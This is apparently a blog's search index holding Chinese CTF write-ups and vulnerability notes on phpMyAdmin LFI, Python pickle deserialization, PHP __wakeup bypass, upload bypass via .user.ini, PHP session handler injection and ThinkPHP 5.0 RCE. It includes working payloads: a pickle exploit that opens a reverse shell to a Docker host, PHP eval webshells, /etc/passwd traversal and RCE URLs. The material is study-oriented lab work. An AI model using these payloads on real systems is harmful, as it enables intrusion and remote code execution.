<?xml version="1.0" encoding="utf-8"?>
<search>
  
  
  
  <entry>
    <title>[GWCTF 2019]我有一个数据库</title>
    <link href="/2020/04/14/%5BGWCTF%202019%5D%E6%88%91%E6%9C%89%E4%B8%80%E4%B8%AA%E6%95%B0%E6%8D%AE%E5%BA%93/"/>
    <url>/2020/04/14/%5BGWCTF%202019%5D%E6%88%91%E6%9C%89%E4%B8%80%E4%B8%AA%E6%95%B0%E6%8D%AE%E5%BA%93/</url>
    
    <content type="html"><![CDATA[<h2 id="GWCTF-2019-我有一个数据库"><a href="#GWCTF-2019-我有一个数据库" class="headerlink" title="[GWCTF 2019]我有一个数据库"></a>[GWCTF 2019]我有一个数据库</h2><p>打开网页，查看网页源码，发现什么都没有。进行目录扫描，发现了：phpmyadmin ，phpinfo.php。</p><p>打开phpmyadmin，直接登录了不需要密码，猜测应该是提权。</p><h5 id="提权"><a href="#提权" class="headerlink" title="提权"></a>提权</h5><p>说道写shell不得不说 MYSQL secure_file_priv对读写文件的影响。首先我们先查看这个参数的值</p><pre><code>SHOW VARIABLES LIKE &quot;secure_file_priv&quot;;</code></pre><p>返回参数为NULL。</p><pre><code>secure_file_priv的值为null ，表示限制mysql不允许导入|导出当secure_file_priv的值为/tmp/ ，表示限制mysql的导入|导出只能发生在/tmp/目录下当secure_file_priv的值没有具体值时，表示不对mysql的导入|导出做限制</code></pre><p>这个时候就可以利用(general_log、general_log file)日志文件getshell，general_log就是记录输入的日志文件，general_log file就是规定日志保存在哪个路径，我们只要输入一句话然后保存网站目录下的php文件就OK了。</p><pre><code>SHOW VARIABLES LIKE &#39;general%&#39;;</code></pre><p><img src="C:%5CUsers%5Cykpc%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20200414121504433.png" srcset="/img/loading.gif" alt="image-20200414121504433"></p><p>设置general_log为on，并且把日志存放路径设置为网站根目录。</p><pre><code>set global general_log = &quot;ON&quot;;SET global general_log_file=&#39;/var/www/html/shell.php&#39;;</code></pre><p>因为网站泄露了phpinfo泄露了绝对路径</p><p>这时候我们查询</p><pre><code>select &#39;&lt;?php eval($_POST[cmd]);?&gt;&#39;;</code></pre><p>然后这种不可以。因为我们没有权限在网站目录下创建日志文件。因为此台服务器上MYSQL并没有被赋予在站点根目录下创建文件的权限。所以也无法写shell并解析。</p><h2 id="思路二："><a href="#思路二：" class="headerlink" title="思路二："></a>思路二：</h2><p>可以知道：phpMyAdmin</p><ul><li>​            版本信息： 4.8.1        </li></ul><p>直接Google发现了4.8.0~4.8.1存在文件包含漏洞。        </p><pre><code>payload:target=db_sql.php%253f/../../../../../../etc/passwd</code></pre><pre><code>?target=db_sql.php%253f/../../../../../../flag</code></pre><p><img src="C:%5CUsers%5Cykpc%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20200414124523159.png" srcset="/img/loading.gif" alt="image-20200414124523159"></p>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>python反序列化漏洞浅析</title>
    <link href="/2020/04/09/python%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E6%B5%85%E6%9E%90/"/>
    <url>/2020/04/09/python%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E6%B5%85%E6%9E%90/</url>
    
    <content type="html"><![CDATA[<h3 id="0x01-前言"><a href="#0x01-前言" class="headerlink" title="0x01 前言"></a>0x01 前言</h3><p>数据序列化常见的应用场景：数据结构网络传输，session存储，cache存储，或者配置文件上传，参数接收等接口处。</p><p>主要作用：能够让数据在存储或者传输的时候能够单单只用string的类型去表述相对复杂的数据结构，方便应用所见即所得，直接进行数据交流处理。</p><p>引发的安全问题：PHP的unserialize/__wakeup()漏洞、struts的ognl、xml解析的一系列漏洞、Ruby on Rails的xml/yaml，本文即将要讲的Python pickle/cPickle库的反序列化漏洞</p><p>此类漏洞常会导致RCE，原因：和我们所提到的应用场景有关。语言需要从string去解析出自己的语言数据结构，必然要去从这个string中做固定格式的解析，然后在内部把解析出来的结果去eval一下；或者，为了保证解析出来的内容为被序列化时候的Object状态，要调用一下状态保存的函数<strong>wakeup</strong></p><h3 id="0x02-Pickle模块"><a href="#0x02-Pickle模块" class="headerlink" title="0x02 Pickle模块"></a>0x02 Pickle模块</h3><ol><li><p>pickle模块用来对Python对象执行序列化和反序列化。Python的任何对象都可以通过它永久保存到硬盘文件。Pickle实际上是先把Python对象（list、dict、class等）转换为字符流，这个字符流包含反序列化（从字符流构建对象）所需的所有数据。</p></li><li><p>pickle有两个主要方法。第一个是dump-把对象导入到文件；第二个是load-从文件中加载对象。</p><p>实例</p><pre><code>import picklel1 = [&#39;data1&#39;,&#39;data2&#39;,&#39;data3&#39;, &#39;data4&#39;]file = open(&quot;testfile&quot;,&#39;wb&#39;) # 把l1保存到文件pickle.dump(l1, file)   file.close() ##############################################file = open(&quot;testfile&quot;,&#39;r&#39;)# 从文件中加载保存的对象l2 = pickle.load(file)  print(l2)# 输出: [&#39;data1&#39;, &#39;data2&#39;, &#39;data3&#39;]</code></pre></li><li><p>pickle instructions</p><pre><code>cossystem(S&#39;/bin/sh&#39;tR.</code></pre><blockquote><p>Pickle is a stack language which means that the pickle instructions push data onto the stack or pop data off of the stack and operate on it in some fashion. To understand how the canonical pickle works, we need only understand six pickle instructions:</p><ul><li><code>c</code>: Read to the newline as the module name, <code>module</code>. Read the next line as the object name, <code>object</code>. Push <code>module.object</code> onto the stack.</li><li><code>(</code>: Insert a marker object onto the stack. For our purpose, this is paired with <code>t</code> to produce a tuple.</li><li><code>t</code>: Pop objects off the stack until a <code>(</code> is popped and create a tuple object containing the objects popped (except for the <code>(</code>) in the order they were /pushed/ onto the stack. The tuple is pushed onto the stack</li><li><code>S</code>: Read the string in quotes up to the newline and push it onto the stack.</li><li><code>R</code>: Pop a tuple and a <a href="http://stackoverflow.com/questions/111234/what-is-a-callable-in-python" target="_blank" rel="noopener">callable</a> off the stack and call the callable with the tuple as arguments. Push the result onto the stack.</li><li><code>.</code>: End of the pickle.</li></ul></blockquote></li></ol><ul><li><p>c：读取新的一行作为模块名module，读取下一行作为对象名<code>object</code>，然后将<code>module.object</code>压入到堆栈中。</p></li><li><p>(：将一个标记对象插入到堆栈中。为了实现我们的目的，该指令会与t搭配使用，以产生一个元组。</p></li><li><p>t：从堆栈中弹出对象，直到一个“<code>(</code>”被弹出，并创建一个包含弹出对象（除了“<code>(</code>”）的元组对象，并且这些对象的顺序必须跟它们压入堆栈时的顺序一致。然后，该元组被压入到堆栈中。</p></li><li><p>S：读取引号中的字符串直到换行符处，然后将它压入堆栈。</p></li><li><p>R：将一个元组和一个可调用对象弹出堆栈，然后以该元组作为参数调用该可调用的对象，最后将结果压入到堆栈中。</p></li><li><p>.：结束pickle。</p><p>说人话：</p></li><li><p>c：接下来的2行内容类似于，<code>os.system</code>、<code>urllib.unquote</code>是<code>module.object</code>的形式。</p></li><li><p>(：就是左括号</p></li><li><p>t：相当于右扩号</p></li><li><p>S：代表本行后面的内容是<code>String</code>，即字符串。</p></li><li><p>R：执行紧靠自己左边的一个括号对中的内容，即<code>(</code> 和他t直接的内容。</p></li><li><p>.：点号结束pickle。</p></li></ul><h3 id="0x03漏洞分析"><a href="#0x03漏洞分析" class="headerlink" title="0x03漏洞分析"></a>0x03漏洞分析</h3><p>类似于php的wakeup魔术方法，python中的<strong>reduce</strong>，可以在被反序列化的时候执行。具体内容请参考Python的官方库文档。而且并不止这一个函数。</p><p>如果序列化的内容可控，只需要将相应代码写入<strong>reduce</strong>函数中，接收端在反序列化的时候就会自动执行。</p><p>下面是一个简单的示例：</p><p>exp:</p><pre><code>import pickleimport subprocessclass m3lon(object):  def __reduce__(self):    return (subprocess.Popen,((&#39;cmd.exe&#39;,),))pickle.dumps(m3lon())# 输出：&quot;csubprocess\nPopen\np0\n((S&#39;cmd.exe&#39;\np1\ntp2\ntp3\nRp4\n.&quot;</code></pre><p>生成payload：<code>csubprocess\nPopen\np0\n((S&#39;cmd.exe&#39;\np1\ntp2\ntp3\nRp4\n.</code></p><p>下面模拟接收端</p><p><a href="https://m3lon.github.io/2018/04/12/浅析python-unpickle反序列化漏洞/1.png" target="_blank" rel="noopener"><img src="https://m3lon.github.io/2018/04/12/%E6%B5%85%E6%9E%90python-unpickle%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/1.png" srcset="/img/loading.gif" alt="img"></a></p><p>弹出shell！</p><h3 id="0x04漏洞利用"><a href="#0x04漏洞利用" class="headerlink" title="0x04漏洞利用"></a>0x04漏洞利用</h3><p>接下来以P神github仓库里的<a href="https://github.com/vulhub/vulhub/blob/master/python/unpickle" target="_blank" rel="noopener">某个开源靶场</a>为例讲解一下实际环境下的漏洞利用,可部署到本地docker复现。</p><p>app.py</p><pre><code>import pickleimport base64from flask import Flask, requestapp = Flask(__name__)@app.route(&quot;/&quot;)def index():    try:        user = base64.b64decode(request.cookies.get(&#39;user&#39;))        user = pickle.loads(user)        username = user[&quot;username&quot;]    except:        username = &quot;Guest&quot;    return &quot;Hello %s&quot; % usernameif __name__ == &quot;__main__&quot;:    app.run()</code></pre><p>exp.py</p><pre><code>#!/usr/bin/env python3import requestsimport pickleimport osimport base64class exp(object):    def __reduce__(self):        s = &quot;&quot;&quot;python -c &#39;import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((&quot;172.17.0.1&quot;,8888));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([&quot;/bin/bash&quot;,&quot;-i&quot;]);&#39;&quot;&quot;&quot;        return (os.system, (s,))e = exp()s = pickle.dumps(e)response = requests.get(&quot;http://172.19.0.2:8000/&quot;, cookies=dict(    user=base64.b64encode(s).decode()))print(response.content)</code></pre><p><strong>分析</strong></p><p>反序列化的内容为user，通过cookie传输(用户可控)，于是pickle的反序列化漏洞便产生了，通过上面的exp可以查看我们生成的payload</p><pre><code>cposix\nsystem\np0\n(S\&#39;python -c \\\&#39;import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((&quot;172.19.0.1&quot;,80));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([&quot;/bin/bash&quot;,&quot;-i&quot;]);\\\&#39;\&#39;\np1\ntp2\nRp3\n.</code></pre><p>接收端在反序列化pickle.loads(user)过程中会自动执行<strong>reduce</strong>方法，弹出bash.</p><p><strong>流程</strong></p><p>利用过程中注意查看本地docker ip，以及docker环境中的ip地址，对应修改exp.py，上面的exp是我在本地修改好的.</p><p><a href="https://m3lon.github.io/2018/04/12/浅析python-unpickle反序列化漏洞/2.png" target="_blank" rel="noopener"><img src="https://m3lon.github.io/2018/04/12/%E6%B5%85%E6%9E%90python-unpickle%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/2.png" srcset="/img/loading.gif" alt="img"></a></p>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>Javaweb利用</title>
    <link href="/2020/04/06/Javaweb%E5%88%A9%E7%94%A8/"/>
    <url>/2020/04/06/Javaweb%E5%88%A9%E7%94%A8/</url>
    
    <content type="html"><![CDATA[<h2 id="WEB-INF主要通过找到web-xml文件，推断class文件的路径，最后直接class文件，在通过反编译class文件，得到网站源码"><a href="#WEB-INF主要通过找到web-xml文件，推断class文件的路径，最后直接class文件，在通过反编译class文件，得到网站源码" class="headerlink" title="WEB-INF主要通过找到web.xml文件，推断class文件的路径，最后直接class文件，在通过反编译class文件，得到网站源码"></a>WEB-INF主要通过找到web.xml文件，推断class文件的路径，最后直接class文件，在通过反编译class文件，得到网站源码</h2><h4 id="https-buuoj-cn-challenges-RoarCTF-202019-Easy-20Java-https-buuoj-cn-challenges-RoarCTF-2019-Easy-Java"><a href="#https-buuoj-cn-challenges-RoarCTF-202019-Easy-20Java-https-buuoj-cn-challenges-RoarCTF-2019-Easy-Java" class="headerlink" title="[https://buuoj.cn/challenges#[RoarCTF%202019\]Easy%20Java](https://buuoj.cn/challenges#[RoarCTF 2019]Easy Java)"></a>[<a href="https://buuoj.cn/challenges#[RoarCTF%202019\]Easy%20Java]" target="_blank" rel="noopener">https://buuoj.cn/challenges#[RoarCTF%202019\]Easy%20Java]</a>(<a href="https://buuoj.cn/challenges#[RoarCTF" target="_blank" rel="noopener">https://buuoj.cn/challenges#[RoarCTF</a> 2019]Easy Java)</h4><h3 id="首先看到一个页面-点击下help看看啥情况。"><a href="#首先看到一个页面-点击下help看看啥情况。" class="headerlink" title="首先看到一个页面,点击下help看看啥情况。"></a>首先看到一个页面,点击下help看看啥情况。</h3><p><a href="https://chen.oinsm.com/2019/10/20/RoarCTF-2019-Easy-Java/1.jpg" target="_blank" rel="noopener"><img src="https://chen.oinsm.com/2019/10/20/RoarCTF-2019-Easy-Java/1.jpg" srcset="/img/loading.gif" alt="img"></a></p><p>发现输出一串</p><pre><code>java.io.FileNotFoundException:{help.docx}</code></pre><p>可能是报错信息，打开Brup截取请求信息</p><pre><code>GET /Download?filename=help.docx HTTP/1.1Host: a6360be7-edf9-4caa-9461-3f2c7a89df9e.node3.buuoj.cnUser-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:69.0) Gecko/20100101 Firefox/69.0Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2Accept-Encoding: gzip, deflateConnection: closeUpgrade-Insecure-Requests: 1Pragma: no-cacheCache-Control: no-cache</code></pre><p>通过查询发现要改成POST，得到许多有用信息</p><p><a href="https://chen.oinsm.com/2019/10/20/RoarCTF-2019-Easy-Java/3.jpg" target="_blank" rel="noopener"><img src="https://chen.oinsm.com/2019/10/20/RoarCTF-2019-Easy-Java/3.jpg" srcset="/img/loading.gif" alt="img"></a></p><pre><code>com.Wm.ctf.DownloadController.doPost</code></pre><p>这个信息跟CTF可能有关,记一下一般有这样都有泄露。</p><p><a href="https://chen.oinsm.com/2019/10/20/RoarCTF-2019-Easy-Java/4.jpg" target="_blank" rel="noopener"><img src="https://chen.oinsm.com/2019/10/20/RoarCTF-2019-Easy-Java/4.jpg" srcset="/img/loading.gif" alt="img"></a></p><h3 id="因为缺少JAVA项目的开发经验，所以查了大量的资料"><a href="#因为缺少JAVA项目的开发经验，所以查了大量的资料" class="headerlink" title="因为缺少JAVA项目的开发经验，所以查了大量的资料"></a>因为缺少JAVA项目的开发经验，所以查了大量的资料</h3><p>我们访问下WEB-INF/web.xml这个文件</p><p><a href="https://chen.oinsm.com/2019/10/20/RoarCTF-2019-Easy-Java/5.jpg" target="_blank" rel="noopener"><img src="https://chen.oinsm.com/2019/10/20/RoarCTF-2019-Easy-Java/5.jpg" srcset="/img/loading.gif" alt="img"></a></p><p>得到了个flag的路径!!!!</p><h2 id="插入一个知识点"><a href="#插入一个知识点" class="headerlink" title="插入一个知识点"></a>插入一个知识点</h2><pre><code>WEB-INF主要包含一下文件或目录:/WEB-INF/web.xml：Web应用程序配置文件，描述了 servlet 和其他的应用组件配置及命名规则。/WEB-INF/classes/：含了站点所有用的 class 文件，包括 servlet class 和非servlet class，他们不能包含在 .jar文件中/WEB-INF/lib/：存放web应用需要的各种JAR文件，放置仅在这个应用中要求使用的jar文件,如数据库驱动jar文件/WEB-INF/src/：源码目录，按照包名结构放置各个java文件。/WEB-INF/database.properties：数据库配置文件漏洞检测以及利用方法：通过找到web.xml文件，推断class文件的路径，最后直接class文件，在通过反编译class文件，得到网站源码</code></pre><h2 id="构造payload"><a href="#构造payload" class="headerlink" title="构造payload:"></a>构造payload:</h2><pre><code>filename=WEB-INF/classes/com/wm/ctf/FlagController.class</code></pre><p>base64解码得到flag</p><p><a href="https://chen.oinsm.com/2019/10/20/RoarCTF-2019-Easy-Java/6.jpg" target="_blank" rel="noopener"><img src="https://chen.oinsm.com/2019/10/20/RoarCTF-2019-Easy-Java/6.jpg" srcset="/img/loading.gif" alt="img"></a></p><h3 id="PS-GET不能读取文件有点懵，没想到居然要改成POST"><a href="#PS-GET不能读取文件有点懵，没想到居然要改成POST" class="headerlink" title="PS: GET不能读取文件有点懵，没想到居然要改成POST"></a>PS: GET不能读取文件有点懵，没想到居然要改成POST</h3>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>【极客大挑战2019】PHP</title>
    <link href="/2020/04/02/%E3%80%90%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%982019%E3%80%91PHP/"/>
    <url>/2020/04/02/%E3%80%90%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%982019%E3%80%91PHP/</url>
    
    <content type="html"><![CDATA[<p>这一题有两个地方卡住我了，第一个是没有想到备份名叫<a href="http://www.zip" target="_blank" rel="noopener">www.zip</a>.<br>第二个是public、protected与private在序列化时的区别。<br><img src="/img/27.png" srcset="/img/loading.gif" alt=""><br>于是在url栏中输入<a href="http://www.zip得到网站源码，发现flag.php进行提交，错误。" target="_blank" rel="noopener">www.zip得到网站源码，发现flag.php进行提交，错误。</a><br>观看源码：<br>index.php</p><pre><code>&lt;?phpinclude &#39;class.php&#39;;$select = $_GET[&#39;select&#39;];$res=unserialize(@$select);?&gt;</code></pre><p>发现了关键代码，考的应该是反序列化漏洞，去看class.php<br>class.php:</p><pre><code>&lt;?php include &#39;flag.php&#39;;  error_reporting(0);  class Name{    private $username = &#39;nonono&#39;;    private $password = &#39;yesyes&#39;;    public function __construct($username,$password){        $this-&gt;username = $username;        $this-&gt;password = $password;    }    function __wakeup(){        $this-&gt;username = &#39;guest&#39;;    }    function __destruct(){        if ($this-&gt;password != 100) {            echo &quot;&lt;/br&gt;NO!!!hacker!!!&lt;/br&gt;&quot;;            echo &quot;You name is: &quot;;            echo $this-&gt;username;echo &quot;&lt;/br&gt;&quot;;            echo &quot;You password is: &quot;;            echo $this-&gt;password;echo &quot;&lt;/br&gt;&quot;;            die();        }        if ($this-&gt;username === &#39;admin&#39;) {            global $flag;            echo $flag;        }else{            echo &quot;&lt;/br&gt;hello my friend~~&lt;/br&gt;sorry i can&#39;t give you the flag!&quot;;            die();        }    }}?&gt;</code></pre><p>发现关键代码：</p><pre><code>      function __wakeup(){          $this-&gt;username = &#39;guest&#39;;      }</code></pre><p>因此需要对__wakeup()进行绕过。<br>接下来写php代码。</p><p>&lt;?php</p><pre><code>class Name{    private $username = &#39;nonono&#39;;    private $password = &#39;yesyes&#39;;    public function __construct($username, $password)    {        $this-&gt;username = $username;        $this-&gt;password = $password;    }}$select = new Name(&#39;admin&#39;,100);$res=serialize(@$select);echo $res;</code></pre><p><img src="/img/28.png" srcset="/img/loading.gif" alt=""></p><blockquote><p>O:4:”Name”:2:{s:14:”Nameusername”;s:5:”admin”;s:14:”Namepassword”;i:100;}</p></blockquote><h1 id="public、protected与private在序列化时的区别"><a href="#public、protected与private在序列化时的区别" class="headerlink" title="public、protected与private在序列化时的区别"></a>public、protected与private在序列化时的区别</h1><p>protected 声明的字段为保护字段，在所声明的类和该类的子类中可见，但在该类的对象实例中不可见。因此保护字段的字段名在序列化时，字段名前面会加上\0<em>\0的前缀。这里的 \0 表示 ASCII 码为 0 的字符(不可见字符)，而不是 \0 组合。这也许解释了，为什么如果直接在网址上，传递\0</em>\0username会报错，因为实际上并不是\0，只是用它来代替ASCII值为0的字符。必须用python传值才可以。<br>private 声明的字段为私有字段，只在所声明的类中可见，在该类的子类和该类的对象实例中均不可见。因此私有字段的字段名在序列化时，类名和字段名前面都会加上\0的前缀。字符串长度也包括所加前缀的长度。其中 \0 字符也是计算长度的。</p><h2 id="exp1"><a href="#exp1" class="headerlink" title="exp1:"></a>exp1:</h2><pre><code>import  requestsurl =&quot;http://7bc3f84d-1e2f-4a49-897a-15eb4d1d5255.node3.buuoj.cn&quot;html = requests.get(url+&#39;?select=O:4:&quot;Name&quot;:3:{s:14:&quot;\0Name\0username&quot;;s:5:&quot;admin&quot;;s:14:&quot;\0Name\0password&quot;;i:100;}&#39;)print(html.text)</code></pre><h2 id="exp2"><a href="#exp2" class="headerlink" title="exp2:"></a>exp2:</h2><p> 如果不使用python提交<br>在url栏中会出现\0<br>有空白符，而复制的时候会丢失。<br>加上%00</p><blockquote><p>payload:</p></blockquote><pre><code>O:4:&quot;Name&quot;:3:{s:14:&quot;%00Name%00username&quot;;s:5:&quot;admin&quot;;s:14:&quot;%00Name%00password&quot;;i:100;}</code></pre>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>上传绕过  .user.ini</title>
    <link href="/2020/03/28/%E4%B8%8A%E4%BC%A0%E7%BB%95%E8%BF%87-user-ini/"/>
    <url>/2020/03/28/%E4%B8%8A%E4%BC%A0%E7%BB%95%E8%BF%87-user-ini/</url>
    
    <content type="html"><![CDATA[<p>今天做了一题是BUUCTF上的checkin<br>一道文件上传题，题目首先对文件内容进行了过滤，过滤了<?因此<?php  ?>就不行了因此应该用<script language="php">eval($_POST['a']);</script>。同时这道题对文件名也过滤的死死的于是想用.htaccess但是发现没有用，后来知道该文件需要apache而这里是nginx。则需要.user.ini</p><blockquote><p>auto_prepend_file=X.jpg</p></blockquote>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>easy calc</title>
    <link href="/2020/03/18/easy-calc/"/>
    <url>/2020/03/18/easy-calc/</url>
    
    <content type="html"><![CDATA[<p><a href="https://www.cnblogs.com/chrysanthemum/p/11757363.html" target="_blank" rel="noopener">https://www.cnblogs.com/chrysanthemum/p/11757363.html</a></p>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>easy_tornado</title>
    <link href="/2020/03/15/easy-tornado/"/>
    <url>/2020/03/15/easy-tornado/</url>
    
    <content type="html"><![CDATA[<p>welcome.txt的页面提示render，就想到了模板注入，flag.txt中告诉了flag文件的位置，hint.txt提示md5(cookie_secret+md5(filename))。</p><p>就是说要通过模板注入找到cookie_secret,然后编写python脚本将flag_name进行md5加密，<br>最后总体加密。同时观察hint.txt的url发现</p><pre><code>file?filename=/hints.txt&amp;filehash=c4d9e17f8cdc1e065a1af55625ffca16</code></pre><p> 那么最终就是：</p><blockquote><blockquote><p>file?filename=/fllllllllllllag&amp;filehash=md5(cookie_secret+md5(filename))</p></blockquote></blockquote><p> python脚本：</p><pre><code> import hashlibdef hash(value):    md5 = hashlib.md5(value)    md5.update(value)    result = md5.hexdigest()    return resultdef jiami():    filename = &#39;/fllllllllllllag&#39;    cookie_S = &#39;de639f1e-0c39-46e5-b8cb-1cd29f56aea3&#39;    print(hash(filename.encode(&#39;utf-8&#39;)))    x = hash(filename.encode(&#39;utf-8&#39;))    y = cookie_S +x    print(hash(y.encode(&#39;utf-8&#39;)))jiami()</code></pre><p>参考链接：<a href="https://blog.csdn.net/cccccfive/article/details/83145669" target="_blank" rel="noopener">https://blog.csdn.net/cccccfive/article/details/83145669</a></p>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>关于php的session.serialize_handler的问题</title>
    <link href="/2020/03/10/%E5%85%B3%E4%BA%8Ephp%E7%9A%84session-serialize-handler%E7%9A%84%E9%97%AE%E9%A2%98/"/>
    <url>/2020/03/10/%E5%85%B3%E4%BA%8Ephp%E7%9A%84session-serialize-handler%E7%9A%84%E9%97%AE%E9%A2%98/</url>
    
    <content type="html"><![CDATA[<p>前言<br>php的session信息是储存在文件中的</p><p>session.save_path=”” 指定储存的路径<br>session.save_handler=”” 指定储存时使用的函数（默认是file）<br>session.auto_start boolen<br>session.serialize_handler=”” 定义序列化和反序列化的处理器的名字，默认是php(5.5.4后改为php_serialize)<br>session.serialize_handler存在以下几种</p><p>php_binary 键名的长度对应的ascii字符+键名+经过serialize()函数序列化后的值<br>php 键名+竖线（|）+经过serialize()函数处理过的值<br>php_serialize 经过serialize()函数处理过的值，会将键名和值当作一个数组序列化<br>使用过程中如果想要修改，使用</p><p>ini_set(‘session.serialize_handler’,’php_serialize’);<br>但这里设置的handler如果和默认的不同，就会出问题</p><p>比如默认是php的handler，在该页面设置为php_serialize</p><p>这是如果我们传入一个 ‘|O:5:”Class”‘;,这样的一个数据，在储存时就会加上键名进行序列化，但是进行读取的时候还是会按照php handler来处理，以|作为键和值的分隔符，将前半部分当作键，后半部分当作值,然后进行反序列化</p><p>CTF<br>jarvisoj PHPINFO</p><p>引用官方文档的内容</p><p>当 session.upload_progress.enabled INI 选项开启时，PHP 能够在每一个文件上传时监测上传进度。 这个信息对上传请求自身并没有什么帮助，但在文件上传时应用可以发送一个POST请求到终端（例如通过XHR）来检查这个状态</p><p>当一个上传在处理中，同时POST一个与INI中设置的session.upload_progress.name同名变量时，上传进度可以在$_SESSION中获得。 当PHP检测到这种POST请求时，它会在$_SESSION中添加一组数据, 索引是 session.upload_progress.prefix 与 session.upload_progress.name连接在一起的值。 通常这些键值可以通过读取INI设置来获得</p><p>通俗的说就是请求时加上与session.upload_progress.name同名的变量时就会在$_SESSION中加上一组新的数据</p><p>来看这道题，题目给了源码</p><?php//A webshell is wait for youini_set('session.serialize_handler', 'php');session_start();class OowoO{    public $mdzz;    function __construct()    {        $this->mdzz = 'phpinfo();';    }    function __destruct()    {        eval($this->mdzz);    }}if(isset($_GET['phpinfo'])){    $m = new OowoO();}else{    highlight_string(file_get_contents('index.php'));}?><p>看到这里使用了ini_set(‘sessionserialize_handler’:’php’),有预感会出现handler不一样的问题</p><p>接下来查看phpinfo，发现php版本是5.6.21，大于5.5.4，默认的handler是php_serialize，会出现上面所述的问题</p><p>在使用session_start()时会自动加载session文件中的值，因为在这里在__destruct方法中使用eval，所以只要在session文件中写入这个类，就能够执行代码？</p><p>但是我们如何将类写入session文件？</p><p>这就用到刚才提到的东西，查看phpinfo，<br>因为session.upload_progress.enabled=1，所以我们就可以post一个和session.upload_progress.name同名的变量，来使得我们上传的文件名写入session</p><p>因为这里是php handler，是以|开头的，所以在反序列化时会按照|来识别键值对而不是按照默认的php_serialize来识别session，所以我们将文件名改为</p><p>“|O:5:&quot;OowoO&quot;:1:{s:4:&quot;mdzz&quot;;s:36:&quot;print_r(scandir(dirname(<strong>FILE</strong>)));&quot;;}”<br>来读取文件目录</p><p>问题<br>session部分的问题大致是解决了……剩下的问题就是……为什么要将双引号转义？暂时还没有弄清楚，待日后分析吧</p>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>PHP_RCE</title>
    <link href="/2020/03/08/PHP-RCE/"/>
    <url>/2020/03/08/PHP-RCE/</url>
    
    <content type="html"><![CDATA[<p>漏洞利用：ThinkPHP 5.0<br>此框架存在远程代码执行漏洞<br>漏洞产生的原因就在于这个控制器这里，整个thinkphp框架里的功能对控制器没有进行严格的安全过滤于检查，使攻击者可以伪造恶意参数进行强制插入，最根本的原因就是正则的表达式写的不好，导致可以绕过。</p><p>在controller获取控制器后，直接进行赋值，但是并没有对控制器的名进行严格的检测，导致可以使用斜杠等特殊符号来远程代码注入。</p><p>我们来搭建一下网站的环境，apache+mysql+Linux centos系统，搭建好的测试环境地址是<a href="http://127.0.01/anquan" target="_blank" rel="noopener">http://127.0.01/anquan</a> ，我们可以直接在index.php后面伪造攻击参数，示例如下：</p><p><a href="http://127.0.0.1/anquan/index.php?s=/index/\think\app/invokefunction&amp;function=call_user_func_array&amp;vars[0]=system&amp;vars[1][]=ls%20-l" target="_blank" rel="noopener">http://127.0.0.1/anquan/index.php?s=/index/\think\app/invokefunction&amp;function=call_user_func_array&amp;vars[0]=system&amp;vars[1][]=ls%20-l</a><br>通过该漏洞也可以直接远程代码注入执行phpinfo语句，查询当前的php版本，路径，扩展，以及php.ini存放的地址，都可以看得到，构造如下代码即可。</p><p><a href="http://127.0.0.1/anquan/index.php?s=/index/\think\app/invokefunction&amp;function=call_user_func_array&amp;vars[0]=system&amp;vars[1][]=php%20-r%20&#39;phpinfo();&#39;" target="_blank" rel="noopener">http://127.0.0.1/anquan/index.php?s=/index/\think\app/invokefunction&amp;function=call_user_func_array&amp;vars[0]=system&amp;vars[1][]=php%20-r%20&#39;phpinfo();&#39;</a></p><p>但是我想能不能输入一句话木马，其实是可以的，但是我在攻防世界的题目中用蚁剑没有连入成功。</p>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>图片验证码灰度化、二值化处理</title>
    <link href="/2020/03/03/%E5%9B%BE%E7%89%87%E9%AA%8C%E8%AF%81%E7%A0%81%E7%81%B0%E5%BA%A6%E5%8C%96%E3%80%81%E4%BA%8C%E5%80%BC%E5%8C%96%E5%A4%84%E7%90%86/"/>
    <url>/2020/03/03/%E5%9B%BE%E7%89%87%E9%AA%8C%E8%AF%81%E7%A0%81%E7%81%B0%E5%BA%A6%E5%8C%96%E3%80%81%E4%BA%8C%E5%80%BC%E5%8C%96%E5%A4%84%E7%90%86/</url>
    
    <content type="html"><![CDATA[<pre><code>import tesserocrfrom PIL import Imageimage = Image.open(&#39;code2.jpg&#39;)image = image.convert(&#39;L&#39;)threshold = 127table = []for i in range(256):    if i &lt; threshold:        table.append(0)    else:        table.append(1)</code></pre><p>   二：</p><pre><code>from PIL import  Imageimport subprocessimage = Image.open(&#39;code.jpg&#39;)image = image.point(lambda x: 0 if x&lt;127 else 255)image.save(&#39;code2.jpg&#39;)subprocess.call([&quot;tesseract&quot;, &#39;code2.jpg&#39;, &quot;output&quot;])with open(&#39;output.txt&#39;, &#39;r&#39;) as f:    print(f.read())</code></pre>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>php intval()函数漏洞，is_numeric() 漏洞，绕过回文判断</title>
